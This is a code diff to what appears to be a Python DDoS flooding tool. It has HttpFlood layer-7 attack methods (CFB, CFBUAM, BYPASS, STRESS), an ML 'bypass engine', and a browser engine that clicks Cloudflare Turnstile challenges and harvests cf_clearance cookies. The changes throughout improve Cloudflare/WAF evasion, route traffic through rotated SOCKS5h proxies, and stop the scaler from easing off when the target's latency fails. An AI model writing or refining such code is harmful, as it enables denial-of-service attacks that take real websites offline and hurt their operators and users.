@@ -763,25 +763,28 @@ def get_optimal_ram_threshold(platform_name: str = sys.platform) -> float:
     return 60.0
 
 
-def promote_target_for_waf(target_url: str, method: str, current_port: int = 80) -> tuple[str, int]:
+def promote_target_for_waf(target_url: str, method: str) -> tuple[str, int]:
     """Auto-promotes HTTP target and port 80 to HTTPS port 443 for TLS/CFB methods to prevent redirect hangs."""
     method_upper = method.upper()
     tls_required_methods = {"CFB", "CFBUAM", "BYPASS", "TLS", "VSE", "NULL", "SLOW", "COOKIE", "STRESS", "DGB", "AVB"}
-    if method_upper in tls_required_methods:
-        try:
-            u = URL(target_url if "://" in target_url else f"http://{target_url}")
-            if u.scheme == "http" or u.port == 80 or current_port == 80:
-                new_port = 443 if u.port in (80, None) or current_port == 80 else u.port
-                promoted_url = str(u.with_scheme("https").with_port(new_port))
-                logger.info(f"[*] WAF Auto-Promotion: Upgraded target from HTTP/80 to HTTPS/443 for method {method_upper}")
-                return promoted_url, 443 if new_port == 443 else new_port
-        except Exception:
-            if target_url.lower().startswith("http://") or current_port == 80:
-                promoted_url = target_url.replace("http://", "https://", 1) if target_url.lower().startswith("http://") else f"https://{target_url}"
-                promoted_url = re.sub(r":80(?=/|$)", "", promoted_url)
+    
+    try:
+        u = URL(target_url if "://" in target_url else f"http://{target_url}")
+        actual_port = u.port
+        if not actual_port:
+            actual_port = 80 if u.scheme == "http" else 443
+            
+        if method_upper in tls_required_methods:
+            if u.scheme == "http" or actual_port == 80:
+                promoted_url = str(u.with_scheme("https").with_port(443))
                 logger.info(f"[*] WAF Auto-Promotion: Upgraded target from HTTP/80 to HTTPS/443 for method {method_upper}")
                 return promoted_url, 443
-    return target_url, current_port
+                
+        return target_url, actual_port
+    except Exception:
+        # Fallback if URL parsing fails
+        is_http = target_url.lower().startswith("http://")
+        return target_url, 80 if is_http else 443
 
 
 class DynamicScaler(Thread):
@@ -803,8 +806,8 @@ class DynamicScaler(Thread):
             max_ram = get_max_ram_threshold()
             opt_ram = get_optimal_ram_threshold()
 
-            # Downscale if host is struggling (CPU > 85% or RAM > max_ram or Latency Timeout)
-            if cpu > 85 or mem > max_ram or lat == -1.0:
+            # Downscale if host is struggling (CPU > 85% or RAM > max_ram)
+            if cpu > 85 or mem > max_ram:
                 self.consecutive_high_load += 1
                 self.consecutive_low_load = 0
                 if self.consecutive_high_load >= 2:
@@ -814,8 +817,8 @@ class DynamicScaler(Thread):
                         ENGINE_STATE.active_threads_target.value = new_target
                     self.consecutive_high_load = 0
             
-            # Upscale if host is bored and target is responding well (CPU < 50%, RAM < opt_ram, Latency < 1000ms)
-            elif cpu < 50 and mem < opt_ram and 0 < lat < 1000:
+            # Upscale if host is bored (CPU < 50%, RAM < opt_ram)
+            elif cpu < 50 and mem < opt_ram:
                 self.consecutive_low_load += 1
                 self.consecutive_high_load = 0
                 if self.consecutive_low_load >= 3:
@@ -1269,22 +1272,29 @@ class TacticalProxyValidator:
                                 from curl_cffi.requests import AsyncSession
                                 px_str = f"http://{proxy}"
                                 if proxy.type == ProxyType.SOCKS4: px_str = f"socks4://{proxy}"
-                                elif proxy.type == ProxyType.SOCKS5: px_str = f"socks5://{proxy}"
+                                elif proxy.type == ProxyType.SOCKS5: px_str = f"socks5h://{proxy}" # Use socks5h for remote DNS
                                 
-                                async with AsyncSession(proxies={"http": px_str, "https": px_str}, verify=False, timeout=3) as session:
-                                    res = await session.get(target_url)
+                                # Neutral endpoint test to avoid CF tar-pitting during validation
+                                neutral_url = "https://1.1.1.1/" if requires_ssl else "http://1.1.1.1/"
+                                # Use a slightly longer timeout for public proxies
+                                async with AsyncSession(proxies={"http": px_str, "https": px_str}, verify=False, timeout=5) as session:
+                                    res = await session.get(neutral_url)
                                     http_status = res.status_code
                                     is_verified = True
                             except Exception:
-                                pass # Fallback to raw TCP salvage
+                                pass # Verification failed
                         
-                        if not is_verified:
+                        if not is_verified and not CURL_CFFI_INSTALLED:
+                            # Only fallback to TCP if we don't have curl_cffi to do real HTTP checks
                             tp = await _check_proxy_async(target_host, proxy, timeout=3.0)
                             if tp.is_protocol_verified:
                                 is_verified = True
                                 http_status = tp.http_status
                             else:
                                 return tp
+                        elif not is_verified:
+                            # For L7 with curl_cffi, if it failed the HTTP check, it's a dead proxy
+                            return TacticalProxy(proxy, 5000.0, False, 0)
                     
                     elif is_udp and proxy.type == ProxyType.SOCKS5:
                         tp = await _check_proxy_async(target_host, proxy, timeout=5.0)
@@ -1774,7 +1784,7 @@ class MLSmartBypassEngine:
                         f["weight"] = min(50.0, f["weight"] * 1.05) # Reward
                         logger.debug(f"[*] ML_ENGINE: Pattern {fp_id} SUCCESS. Weight increased to {f['weight']:.1f}")
                     else:
-                        f["weight"] = max(1.0, f["weight"] * 0.8) # Penalize
+                        f["weight"] = max(0.1, f["weight"] * 0.8) # Penalize harder, allow near-death
                         logger.debug(f"[!] ML_ENGINE: Pattern {fp_id} FAILED/BLOCKED. Weight decreased to {f['weight']:.1f}")
                     break
 
@@ -2237,7 +2247,7 @@ class BrowserEngine:
                 payload_data = {
                     "cmd": "request.get",
                     "url": url,
-                    "maxTimeout": 15000
+                    "maxTimeout": 60000
                 }
                 if proxy:
                     payload_data["proxy"] = {"url": f"http://{proxy}" if "://" not in proxy else proxy}
@@ -2247,7 +2257,7 @@ class BrowserEngine:
                     data=payload,
                     headers={"Content-Type": "application/json"}
                 )
-                with urllib.request.urlopen(req, timeout=18) as resp:
+                with urllib.request.urlopen(req, timeout=65) as resp:
                     resp_data = json.loads(resp.read().decode("utf-8"))
                     if resp_data.get("status") == "ok" and resp_data.get("solution"):
                         sol = resp_data["solution"]
@@ -2409,7 +2419,7 @@ class BrowserEngine:
 
                         # Final extraction
                         try:
-                            cookies = await page.get_cookies()
+                            cookies = await browser.cookies.get_all()
                             cookie_str = "; ".join([f"{c.name}={c.value}" for c in cookies])
                             ua = await page.evaluate("navigator.userAgent")
                             if "cf_clearance" in cookie_str:
@@ -2487,24 +2497,35 @@ class BrowserEngine:
 
                     # 2. Challenge Identification & Interaction
                     try:
-                        # Shadow DOM Traversal for Turnstile
-                        all_inputs = page.eles("tag:input")
-                        for input_elem in all_inputs:
-                            name = input_elem.attr("name")
-                            if name and "turnstile" in name.lower():
-                                parent = input_elem.parent()
-                                if parent and parent.shadow_root:
-                                    shadow1 = parent.shadow_root
-                                    for child in shadow1.children():
-                                        if child.tag == "iframe":
-                                            iframe_body = child("tag:body")
-                                            if iframe_body and iframe_body.shadow_root:
-                                                shadow2 = iframe_body.shadow_root
-                                                checkbox = shadow2("tag:input")
-                                                if checkbox:
-                                                    checkbox.click()
-                                                    logger.debug(f"[*] Headless Recon: Challenge widget clicked via Shadow DOM.")
-                                                    break
+                        # Try robust selectors first before shadow dom
+                        found = False
+                        for sel in ["input[type='checkbox']", "#challenge-stage", ".ctp-checkbox-container"]:
+                            ele = page.ele(sel, timeout=0.1)
+                            if ele:
+                                ele.click(by_js=True)
+                                logger.debug(f"[*] Headless Recon (Tier 2): Challenge widget clicked via selector {sel}.")
+                                found = True
+                                break
+                        
+                        if not found:
+                            # Fallback to Shadow DOM Traversal for Turnstile
+                            all_inputs = page.eles("tag:input")
+                            for input_elem in all_inputs:
+                                name = input_elem.attr("name")
+                                if name and "turnstile" in name.lower():
+                                    parent = input_elem.parent()
+                                    if parent and parent.shadow_root:
+                                        shadow1 = parent.shadow_root
+                                        for child in shadow1.children():
+                                            if child.tag == "iframe":
+                                                iframe_body = child("tag:body")
+                                                if iframe_body and iframe_body.shadow_root:
+                                                    shadow2 = iframe_body.shadow_root
+                                                    checkbox = shadow2("tag:input")
+                                                    if checkbox:
+                                                        checkbox.click(by_js=True)
+                                                        logger.debug(f"[*] Headless Recon (Tier 2): Challenge widget clicked via Shadow DOM.")
+                                                        break
                     except Exception: 
                         pass
                     sleep(1.5) # Increased delay for slow SOCKS nodes
@@ -2697,6 +2718,22 @@ class BrowserEngine:
                         
                         # Turnstile interaction
                         for attempt in range(12):
+                            # Try robust locator clicks first, then fallback to frame bounding box
+                            try:
+                                for sel in ["input[type='checkbox']", "#challenge-stage", ".ctp-checkbox-container"]:
+                                    if page.locator(sel).count() > 0:
+                                        box = page.locator(sel).first.bounding_box()
+                                        if box:
+                                            tx = box['x'] + (box['width'] / 2) + randint(-5, 5)
+                                            ty = box['y'] + (box['height'] / 2) + randint(-5, 5)
+                                            page.mouse.move(tx, ty, steps=randint(5, 10))
+                                            sleep(0.3)
+                                            page.mouse.click(tx, ty)
+                                            page.wait_for_timeout(2000)
+                                            break
+                            except Exception:
+                                pass
+
                             for frame in page.frames:
                                 try:
                                     f_url = frame.url.lower()
@@ -4461,9 +4498,12 @@ class HttpFlood:
                 pro = self._proxy_pool.get_proxy() if self._proxy_pool else None
                 proxies = None
                 if pro:
-                    px = pro.asRequest()
-                    px_str = px.get("http", f"http://{pro}")
-                    proxies = {"http": px_str, "https": px_str}
+                    px_req = pro.asRequest()
+                    if px_req.get("http", "").startswith("socks5://"):
+                        px_req["http"] = px_req["http"].replace("socks5://", "socks5h://")
+                    if px_req.get("https", "").startswith("socks5://"):
+                        px_req["https"] = px_req["https"].replace("socks5://", "socks5h://")
+                    proxies = {"http": px_req["http"], "https": px_req["https"]}
                 
                 fp = ML_ENGINE.get_fingerprint()
                 async with AsyncSession(
@@ -4504,10 +4544,19 @@ class HttpFlood:
 
         for _ in range(self._rpc):
             pro = self._proxy_pool.get_proxy() if self._proxy_pool else None
+            proxies = None
+            if pro:
+                px_req = pro.asRequest()
+                if px_req.get("http", "").startswith("socks5://"):
+                    px_req["http"] = px_req["http"].replace("socks5://", "socks5h://")
+                if px_req.get("https", "").startswith("socks5://"):
+                    px_req["https"] = px_req["https"].replace("socks5://", "socks5h://")
+                proxies = {"http": px_req["http"], "https": px_req["https"]}
+                
             try:
                 res = scraper.get(
                     self._target.human_repr(),
-                    proxies=pro.asRequest() if pro else None,
+                    proxies=proxies,
                     timeout=5
                 )
                 BYTES_SEND += len(res.content) + len(str(res.headers))
@@ -4616,11 +4665,21 @@ class HttpFlood:
                 if HttpFlood._cfbuam_cookie and HttpFlood._cfbuam_proxy:
                     # IP-lock bypass: force the solver proxy for the flood loop
                     px = f"http://{HttpFlood._cfbuam_proxy}" if "://" not in HttpFlood._cfbuam_proxy else HttpFlood._cfbuam_proxy
+                    if px.startswith("socks5://"):
+                        px = px.replace("socks5://", "socks5h://")
                     proxies = {"http": px, "https": px}
                     pro = None
                 else:
                     pro = self._proxy_pool.get_proxy() if self._proxy_pool else None
-                    proxies = {"http": pro.asRequest()["http"], "https": pro.asRequest()["https"]} if pro else None
+                    if pro:
+                        px_req = pro.asRequest()
+                        if px_req.get("http", "").startswith("socks5://"):
+                            px_req["http"] = px_req["http"].replace("socks5://", "socks5h://")
+                        if px_req.get("https", "").startswith("socks5://"):
+                            px_req["https"] = px_req["https"].replace("socks5://", "socks5h://")
+                        proxies = {"http": px_req["http"], "https": px_req["https"]}
+                    else:
+                        proxies = None
                 
                 profile = BrowserEngine.get_curl_profile(ua)
                 async with AsyncSession(impersonate=profile, proxies=proxies, verify=False) as s:
@@ -5678,7 +5737,7 @@ async def main_async():
         timer = 3600
 
         if method in Methods.LAYER7_METHODS:
-            urlraw, _port_tmp = promote_target_for_waf(urlraw, method, 80 if urlraw.lower().startswith("http://") else 443)
+            urlraw, port = promote_target_for_waf(urlraw, method)
             url = URL(urlraw)
             target_host = url.host
             host = target_host
